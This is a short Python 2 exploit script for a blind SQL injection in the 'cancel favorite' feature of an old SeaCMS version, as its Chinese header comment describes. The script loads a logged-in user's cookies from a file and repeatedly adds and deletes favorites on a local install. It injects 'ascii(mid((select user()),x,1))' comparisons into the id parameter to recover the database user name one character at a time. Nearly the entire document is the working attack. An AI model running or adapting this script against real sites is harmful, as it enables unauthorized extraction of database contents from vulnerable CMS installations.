#!/usr/bin/env python
# coding=utf-8
#seacms老版本的一个注入漏洞，在删除收藏时没有过滤所以引起delete注入，只不过利用方法是需要用程序自动添加收藏，删除收藏时注入。

import re
import sys
import time
import requests

reload(sys)
sys.setdefaultencoding('utf-8')
headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
}

#cookies文件需要添加浏览器中的cookies，并且浏览器不能退出账号。
f =  open(r'cookies.txt', 'r')
cookies = {}
for line in f.read().split(";"):
    name, value = line.strip().split("=",1)
    cookies[name]=value

stop_flag = 0
saveurl = "http://127.0.0.1/seacms_A5/upload/include/ajax.php?action=addfav&id=2&uid=1"
favurl = "http://127.0.0.1/seacms_A5/upload/member.php?action=favorite"
sess = requests.Session()

key = ""
#xrange函数的第二个参数需要根据情况修改，如果低于阈值则无法跑停止标记。
for i in xrange(1,300,1):
    req1 = sess.get(saveurl, cookies=cookies, timeout=10)
    cancelurl = "http://127.0.0.1/seacms_A5/upload/member.php?action=cancelfav&id="+str(i)
    req2 = sess.get(cancelurl, cookies=cookies, timeout=10)
    req3 = sess.get(favurl, cookies=cookies, timeout=10)
    if req3.text.find("bbb") is -1:
        stop_flag = i
        break

cus_pos = stop_flag + 1
print cus_pos

for x in range(1,15):
    req4 = sess.get(saveurl, cookies=cookies, timeout=10)
    for y in range(1,150,1):
        cancelurl = "http://127.0.0.1/seacms_A5/upload/member.php?action=cancelfav&id="+str(cus_pos)+" and ascii(mid((select user()),"+str(x)+",1))="+str(y)
        print cancelurl
        req5 = sess.get(cancelurl, cookies=cookies, timeout=10)
        req6 = sess.get(favurl, cookies=cookies, timeout=10)
        if req6.text.find("bbb") is -1:
            print chr(y)
            key += chr(y)
            cus_pos += 1
            break

    print "User: "+key





